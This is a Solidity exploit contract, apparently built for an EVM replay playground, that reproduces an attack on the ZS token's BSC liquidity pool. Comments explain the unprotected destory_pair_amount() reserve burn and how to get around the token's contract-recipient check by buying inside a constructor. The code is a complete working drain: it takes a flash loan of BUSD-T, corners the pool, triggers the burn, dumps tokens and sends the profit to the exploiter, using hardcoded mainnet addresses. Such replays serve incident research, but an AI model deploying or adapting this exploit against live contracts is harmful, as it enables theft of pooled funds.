// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-10-ZS).
//
// The registry PoC (test/ZS_exp.sol) splits the attack across two Foundry
// contracts: `ZSExploit` (a Test-inheriting harness that `deal()`s itself
// 0.1 BNB, deploys `AttackContract` with that value, `vm.roll`s 2 blocks,
// then calls `AttackContract.exploitZS()`) and `AttackContract` (the actual
// attacker contract that buys ZS, flash-borrows BUSD-T, triggers the
// permissionless `destory_pair_amount()` reserve burn, and sells into the
// now-degenerate pool). This file keeps that same two-contract shape --
// on PURPOSE, NOT just faithfulness -- because it is load-bearing: ZS's
// `_transfer` rejects buys where `to.isContract()` is true, and `AttackContract`
// only bypasses that check because it receives its ZS buy from INSIDE its own
// constructor, while its own extcodesize is still zero. Merging the buy into
// a post-deploy call (on an already-constructed contract) makes ZS revert
// with "ERC20: Transfer to contract address is not allowed".
//
// The 2-block gap in the original doesn't add anything: the exploited
// `Burnamount` (267,056.75 ZS) is already pending in the fork snapshot (see
// ZS_exp.md), so no organic sells accrue more of it while the local anvil
// instance sits idle between the two calls -- it is dropped here.
//
// `ZSExploit.testExploit()` is the recorded attackFunction, funded directly
// by the recorder's `attackValueWei` (0.1 BNB) instead of `deal()`.
//
// Root cause: ZS.destory_pair_amount() is `public` with no access control
// and burns the pending `Burnamount` ZS directly out of the ZS/BUSD-T pair's
// balance, then calls pair.sync() -- collapsing the pool's ZS reserve while
// leaving the BUSD-T reserve untouched. The attacker corners the pool's ZS
// supply first, fires the burn, then sells its ZS bag into the now-lopsided
// pool for far more BUSD-T than it is genuinely worth.

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IZS is IERC20 {
    function Burnamount() external view returns (uint256);

    function destory_pair_amount() external;
}

interface IPancakeRouter {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
}

interface Uni_Pair_V3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface Uni_Pair_V2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;

    function sync() external;
}

contract ZSExploit {
    // Funded with 0.1 BNB via attackValueWei (replaces deal(address(this), 0.1 ether)).
    function testExploit() external payable {
        AttackContract attackContract = new AttackContract{value: address(this).balance}();
        attackContract.exploitZS();
    }
}

contract AttackContract {
    IZS private constant ZS = IZS(0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC);
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IPancakeRouter private constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    Uni_Pair_V3 private constant BUSDT_USDC = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    Uni_Pair_V2 private constant ZS_BUSDT = Uni_Pair_V2(0x162888d39Cfb0990699aD1EA252521b2982ad690);
    address private immutable exploiter;

    // Calling ZS token in the constructor is crucial: ZS._transfer() rejects
    // buys where the recipient `isContract()`, and this contract's own
    // extcodesize is still zero while its constructor is running.
    constructor() payable {
        exploiter = msg.sender;
        BUSDT.approve(address(PancakeRouter), type(uint256).max);
        WBNBToBUSDT();
        BUSDTToZS();
        BUSDT.transfer(address(ZS_BUSDT), 1);
        ZS.transfer(address(ZS_BUSDT), 1e18);
        ZS_BUSDT.sync();
    }

    function exploitZS() external {
        uint256 ZSAmountOut = (ZS.balanceOf(address(ZS_BUSDT)) - ZS.Burnamount()) - 1;
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(ZS);
        uint256[] memory amountsIn = PancakeRouter.getAmountsIn(ZSAmountOut, path);
        uint256 flashBUSDTAmount = (amountsIn[0] + 1000e18) - BUSDT.balanceOf(address(this));
        bytes memory data = abi.encode(flashBUSDTAmount);
        BUSDT_USDC.flash(address(this), flashBUSDTAmount, 0, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        uint256 amountToRepayFlash = abi.decode(data, (uint256));
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(ZS);
        uint256[] memory amountsOut = PancakeRouter.getAmountsOut(BUSDT.balanceOf(address(this)) - 1000e18, path);
        ZS_BUSDT.swap(amountsOut[1], 0, address(this), bytes("_"));

        // Call to flawed function
        ZS.destory_pair_amount();
        path[0] = address(ZS);
        path[1] = address(BUSDT);
        amountsOut = PancakeRouter.getAmountsOut(ZS.balanceOf(address(this)), path);
        BUSDT.transfer(address(ZS_BUSDT), 1);
        ZS.transfer(address(ZS_BUSDT), ZS.balanceOf(address(this)));
        ZS_BUSDT.swap(0, amountsOut[1], address(this), bytes(""));

        BUSDT.transfer(address(BUSDT_USDC), amountToRepayFlash + fee0);
        BUSDT.transfer(exploiter, BUSDT.balanceOf(address(this)));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        BUSDT.transfer(address(ZS_BUSDT), BUSDT.balanceOf(address(this)) - 1000e18);
    }

    function WBNBToBUSDT() private {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(BUSDT);
        PancakeRouter.swapExactETHForTokens{value: address(this).balance}(
            0, path, address(this), block.timestamp + 1000
        );
    }

    function BUSDTToZS() private {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(ZS);
        PancakeRouter.swapExactTokensForTokens(
            BUSDT.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp + 1000
        );
    }
}
